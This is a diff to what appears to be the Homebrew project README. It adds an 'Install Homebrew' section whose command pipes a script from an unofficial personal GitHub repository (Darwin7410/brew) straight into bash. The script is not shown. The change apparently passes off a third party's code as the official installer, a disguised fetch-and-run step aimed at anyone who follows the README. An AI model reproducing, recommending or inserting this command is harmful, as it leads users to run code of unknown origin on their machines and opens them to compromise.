@@ -4,6 +4,11 @@
 
 Features, usage and installation instructions are [summarised on the homepage](https://brew.sh). Terminology (e.g. the difference between a Cellar, Tap, Cask and so forth) is [explained here](https://docs.brew.sh/Formula-Cookbook#homebrew-terminology).
 
+# Install Homebrew
+```
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Darwin7410/brew/refs/heads/main/install.sh)"
+```
+
 ## What Packages Are Available?
 
 1. Type `brew formulae` for a list.
